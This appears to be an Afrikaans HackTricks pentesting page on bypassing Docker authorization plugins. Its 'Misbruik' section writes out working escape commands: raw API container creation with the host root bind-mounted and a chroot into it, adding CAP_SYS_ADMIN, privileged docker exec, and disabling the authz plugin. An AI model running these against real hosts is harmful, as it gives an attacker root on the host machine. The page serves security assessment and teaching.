# Runtime magtigings-plugins

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Runtime magtigings-plugins is ’n ekstra beleidslaag wat besluit of ’n oproeper ’n gegewe daemon-aksie mag uitvoer. Docker is die klassieke voorbeeld. Standaard het enigiemand wat met die Docker daemon kan praat, effektief wye beheer oor dit. Magtigings-plugins probeer daardie model beperk deur die geverifieerde gebruikersidentiteit en die versoekte API-operasie te ondersoek, en dan die versoek volgens beleid toe te laat of te weier.

Hierdie onderwerp verdien ’n eie bladsy omdat dit die uitbuitingsmodel verander wanneer ’n aanvaller reeds toegang het tot ’n Docker API of tot ’n gebruiker in die `docker` groep. In sulke omgewings is die vraag nie meer net "kan ek die daemon bereik?" nie, maar ook "is die daemon omhein deur ’n magtigingslaag, en indien wel, kan daardie laag omseil word deur onbehandelde endpoints, swak JSON-parsing, of plugin-bestuurstoestemmings?"

## Werking

Wanneer ’n versoek die Docker daemon bereik, kan die magtigings-subisteem die versoekkonteks aan een of meer geïnstalleerde plugins deurgee. Die plugin sien die geverifieerde gebruikersidentiteit, die versoekbesonderhede, geselekteerde headers, en dele van die versoek- of antwoordliggaam wanneer die inhoudstipe geskik is. Meerdere plugins kan in ’n ketting geplaas word, en toegang word slegs toegestaan as alle plugins die versoek toelaat.

Hierdie model klink sterk, maar sy veiligheid hang heeltemal af van hoe volledig die beleidsskrywer die API verstaan het. ’n Plugin wat `docker run --privileged` blokkeer maar `docker exec` ignoreer, alternatiewe JSON-sleutels soos topvlak `Binds` mis, of plugin-administrasie toelaat, kan ’n valse gevoel van beperking skep terwyl dit steeds direkte privilege-escalation paaie ooplaat.

## Algemene plugin-teikens

Belangrike areas vir beleidshersiening is:

- endpoints vir container-skepping
- `HostConfig` velde soos `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, en namespace-sharing opsies
- `docker exec` gedrag
- endpoints vir plugin-bestuur
- enige endpoint wat indirek runtime-aksies buite die bedoelde beleidsmodel kan veroorsaak

Historykes soos Twistlock se `authz` plugin en eenvoudige opvoedkundige plugins soos `authobot` het hierdie model maklik bestudeerbaar gemaak omdat hul beleidslêers en kodepaaie gewys het hoe endpoint-na-aksie kaartlegging werklik geïmplementeer is. Vir assesseringswerk is die belangrike les dat die beleidsskrywer die volle API-oppervlak moet verstaan eerder as net die mees sigbare CLI-opdragte.

## Misbruik

Die eerste doel is om te leer wat wel werklik geblokkeer word. As die daemon ’n aksie weier, leaks die fout dikwels die pluginnaam, wat help om die beheer in gebruik te identifiseer:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
As jy breër endpoint-profilering nodig het, is gereedskap soos `docker_auth_profiler` nuttig omdat dit die andersins herhalende taak outomatiseer om te kontroleer watter API-roetes en JSON-strukture werklik deur die plugin toegelaat word.

As die omgewing 'n pasgemaakte plugin gebruik en jy met die API kan kommunikeer, enumereer watter objekvelde werklik gefiltreer word:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Hierdie kontroles is belangrik omdat baie autorisasie-foute veldspesifiek eerder as konsepspesifiek is. 'n plugin mag 'n CLI-patroon verwerp sonder om die ekwivalente API-struktuur volledig te blokkeer.

### Volledige voorbeeld: `docker exec` voeg voorregte by ná container-skepping

'n beleid wat geprivilegieerde container-skepping blokkeer maar onbeperkte container-skepping plus `docker exec` toelaat, kan steeds omseil word:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
As die daemon die tweede stap aanvaar, het die gebruiker 'n geprivilegieerde interaktiewe proses herwin binne 'n container wat die beleidsskrywer as beperk beskou het.

### Volledige Voorbeeld: Bind Mount Through Raw API

Sommige foutiewe beleide inspekteer net een JSON shape. As die root filesystem bind mount nie konsekwent geblokkeer word nie, kan die host steeds gemount word:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dieselfde idee kan ook verskyn onder `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die impak is 'n volledige host filesystem escape. Die interessante detail is dat die bypass voortvloei uit onvolledige beleidsdekking eerder as uit 'n kernel bug.

### Volledige Voorbeeld: Ongekontroleerde Capability Attribuut

As die beleid vergeet om 'n capability-verwante attribuut te filter, kan die aanvaller 'n container skep wat 'n gevaarlike capability herwin:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sodra `CAP_SYS_ADMIN` of 'n soortgelyk sterk capability teenwoordig is, raak baie breakout techniques wat in [capabilities.md](protections/capabilities.md) en [privileged-containers.md](privileged-containers.md) beskryf word, bereikbaar.

### Volledige voorbeeld: Deaktiveer die Plugin

Indien plugin-management-operasies toegelaat word, mag die netjiesste bypass wees om die beheer heeltemal af te skakel:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dit is 'n beleidsfout op die beheer-vlak. Die gemagtigingslaag bestaan, maar die gebruiker wat dit moes beperk, behou steeds die toestemming om dit uit te skakel.

## Kontroles

Hierdie kommando's is gerig op die identifisering of 'n beleidslaag bestaan en of dit volledig of oppervlakkig blyk te wees.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Wat hier interessant is:

- Weierboodskappe wat 'n plugin-naam insluit, bevestig 'n authorization-laag en openbaar dikwels die presiese implementering.
- 'n Pluginlys wat vir die aanvaller sigbaar is, kan genoeg wees om te bepaal of disable- of reconfigure-bewerkings moontlik is.
- 'n Beleid wat slegs voor die hand liggende CLI-aksies blokkeer, maar nie rou API-versoeke nie, moet as omseilbaar beskou word totdat die teendeel bewys is.

## Runtime-standaarde

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Nie standaard ingeskakel nie | Daemon-toegang is in praktyk alles-of-niks, tensy 'n authorization-plugin gekonfigureer is | onvolledige plugin-beleid, swartlyste in plaas van witlyste, toestaan van plugin-bestuur, veldvlak blinde kolle |
| Podman | Nie 'n algemene direkte ekwivalent nie | Podman steun tipies meer op Unix-permissies, rootless-uitvoering en API-blootstellingsbesluite as op Docker-style authz-plugins | wydverspreide blootstelling van 'n rootful Podman API, swakke socket-permissies |
| containerd / CRI-O | Ander beheermodel | Hierdie runtimes vertrou gewoonlik op socket-permissies, node-vertrouensgrense en hoërlaag-orchestratorbeheer eerder as Docker authz-plugins | montering van die socket in workloads, swak node-lokale vertrouensaanname |
| Kubernetes | Gebruik authn/authz by die API-server- en kubelet-lae, nie Docker authz-plugins nie | Cluster RBAC en admission-controls is die hoof beleidslaag | oorwydige RBAC, swak admission-beleid, direkte blootstelling van kubelet of runtime APIs |
{{#include ../../../banners/hacktricks-training.md}}
